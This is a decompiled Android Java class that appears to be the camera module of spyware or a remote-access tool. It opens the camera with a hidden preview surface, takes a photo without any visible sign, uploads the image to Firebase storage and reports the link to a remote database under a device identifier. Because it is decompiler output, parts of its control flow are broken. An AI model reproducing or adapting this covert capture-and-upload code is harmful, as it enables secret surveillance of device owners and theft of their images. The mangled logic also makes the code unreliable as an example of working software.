/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.BitmapFactory
 *  android.graphics.SurfaceTexture
 *  android.hardware.Camera
 *  android.hardware.Camera$Parameters
 *  android.hardware.Camera$PictureCallback
 *  android.hardware.Camera$ShutterCallback
 *  android.hardware.Camera$Size
 *  android.net.Uri
 *  com.google.android.gms.tasks.Continuation
 *  com.google.android.gms.tasks.OnCompleteListener
 *  com.google.android.gms.tasks.OnFailureListener
 *  com.google.android.gms.tasks.OnSuccessListener
 *  com.google.android.gms.tasks.Task
 *  com.google.firebase.database.DatabaseReference
 *  com.google.firebase.database.FirebaseDatabase
 *  com.google.firebase.storage.FileDownloadTask
 *  com.google.firebase.storage.FileDownloadTask$TaskSnapshot
 *  com.google.firebase.storage.FirebaseStorage
 *  com.google.firebase.storage.OnProgressListener
 *  com.google.firebase.storage.StorageReference
 *  com.google.firebase.storage.StorageTask
 *  com.google.firebase.storage.UploadTask
 *  com.google.firebase.storage.UploadTask$TaskSnapshot
 *  java.io.ByteArrayOutputStream
 *  java.io.File
 *  java.io.FileNotFoundException
 *  java.io.FileOutputStream
 *  java.io.IOException
 *  java.io.OutputStream
 *  java.lang.Exception
 *  java.lang.Object
 *  java.lang.RuntimeException
 *  java.lang.String
 *  java.lang.StringBuilder
 *  java.util.HashMap
 *  java.util.List
 *  java.util.Random
 */
package sigma.male;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.Uri;
import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.StorageTask;
import com.google.firebase.storage.UploadTask;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import sigma.male.FileUtil;
import sigma.male.gui;

public class cams {
    private OnSuccessListener _fbs_delete_success_listener;
    private OnProgressListener _fbs_download_progress_listener;
    private OnSuccessListener<FileDownloadTask.TaskSnapshot> _fbs_download_success_listener;
    private OnFailureListener _fbs_failure_listener;
    private OnProgressListener _fbs_upload_progress_listener;
    private OnCompleteListener<Uri> _fbs_upload_success_listener;
    private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
    private FirebaseStorage _firebase_storage = FirebaseStorage.getInstance();
    private Camera camera;
    private Context contextt;
    private StorageReference fbs = this._firebase_storage.getReference("root");
    private OutputStream out;
    private HashMap<String, Object> responsetxt = new HashMap();

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public cams(Context context) {
        try {
            this.contextt = context;
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        this.initialize();
    }

    private void initialize() {
        this._fbs_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>(){

            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>(){

            public void onProgress(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_upload_success_listener = new OnCompleteListener<Uri>(){

            public void onComplete(Task<Uri> task) {
                String string2 = ((Uri)task.getResult()).toString();
                cams.this._setrespo("camview", "", string2, "", "");
            }
        };
        this._fbs_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>(){

            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_delete_success_listener = new OnSuccessListener(){

            public void onSuccess(Object object) {
            }
        };
        this._fbs_failure_listener = new OnFailureListener(){

            public void onFailure(Exception exception) {
                exception.getMessage();
            }
        };
    }

    private void releaseCamera() {
        if (this.camera != null) {
            this.camera.stopPreview();
            this.camera.release();
            this.camera = null;
        }
    }

    private void sendPhoto(byte[] arrby, Context context) {
        new ByteArrayOutputStream();
        Bitmap bitmap = BitmapFactory.decodeByteArray((byte[])arrby, (int)0, (int)arrby.length);
        String string2 = String.valueOf((Object)context.getExternalFilesDir(null).getAbsolutePath()) + "/" + gui.uuii(context) + ".png";
        try {
            if (FileUtil.isExistFile(String.valueOf((Object)FileUtil.getPackageDataDir(context)) + "/" + gui.uuii(context) + ".png")) {
                FileUtil.deleteFile(String.valueOf((Object)FileUtil.getPackageDataDir(context)) + "/" + gui.uuii(context) + ".png");
            }
            FileOutputStream fileOutputStream = new FileOutputStream(string2);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, (OutputStream)fileOutputStream);
            final String string3 = String.valueOf((Object)FileUtil.getPackageDataDir(context)) + "/" + gui.uuii(context) + ".png";
            this.fbs.child(string3).putFile(Uri.fromFile((File)new File(string3))).addOnFailureListener(this._fbs_failure_listener).addOnProgressListener(this._fbs_upload_progress_listener).continueWithTask((Continuation)new Continuation<UploadTask.TaskSnapshot, Task<Uri>>(){

                public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
                    return cams.this.fbs.child(string3).getDownloadUrl();
                }
            }).addOnCompleteListener(this._fbs_upload_success_listener);
            return;
        }
        catch (FileNotFoundException fileNotFoundException) {
            return;
        }
        catch (IOException iOException) {
            return;
        }
    }

    public void _setrespo(String string2, String string3, String string4, String string5, String string6) {
        this.responsetxt.clear();
        this.responsetxt = new HashMap();
        this.responsetxt.put((Object)"respo", (Object)string2);
        this.responsetxt.put((Object)"var2", (Object)string3);
        this.responsetxt.put((Object)"v1", (Object)string4);
        this.responsetxt.put((Object)"v2", (Object)string5);
        this.responsetxt.put((Object)"v3", (Object)string6);
        String string7 = String.valueOf((Object)"abcdefghijklmnopqrstuvwxyz") + "0123456789";
        Random random = new Random();
        StringBuilder stringBuilder = new StringBuilder(8);
        stringBuilder.append(string7.charAt(random.nextInt(-1 + string7.length())));
        int n = stringBuilder.length();
        do {
            if (n >= 8) {
                this.responsetxt.put((Object)"rndm", (Object)stringBuilder.toString());
                this._firebase.getReference("/respos/respo" + gui.uuii(this.contextt)).child("respo").setValue(this.responsetxt);
                return;
            }
            stringBuilder.append(string7.charAt(random.nextInt(string7.length())));
            ++n;
        } while (true);
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public void startUp(int n, final Context context) {
        try {
            this.camera = Camera.open((int)n);
        }
        catch (RuntimeException runtimeException) {
            runtimeException.printStackTrace();
        }
        if (this.camera == null) {
            this._setrespo("camview", "", "", "", "");
            return;
        }
        Camera.Parameters parameters = this.camera.getParameters();
        List list = parameters.getSupportedPictureSizes();
        Camera.Size size = (Camera.Size)list.get(0);
        int n2 = 0;
        Camera.Size size2 = size;
        do {
            if (n2 >= list.size()) {
                parameters.setPictureSize(size2.width, size2.height);
                this.camera.setParameters(parameters);
                this.camera.setPreviewTexture(new SurfaceTexture(0));
                this.camera.startPreview();
            }
            Camera.Size size3 = ((Camera.Size)list.get((int)n2)).width > size2.width ? (Camera.Size)list.get(n2) : size2;
            ++n2;
            size2 = size3;
        } while (true);
        catch (Exception exception) {
            exception.printStackTrace();
        }
        this.camera.takePicture(null, null, new Camera.PictureCallback(){

            public void onPictureTaken(byte[] arrby, Camera camera) {
                cams.this.releaseCamera();
                cams.this.sendPhoto(arrby, context);
            }
        });
    }

}

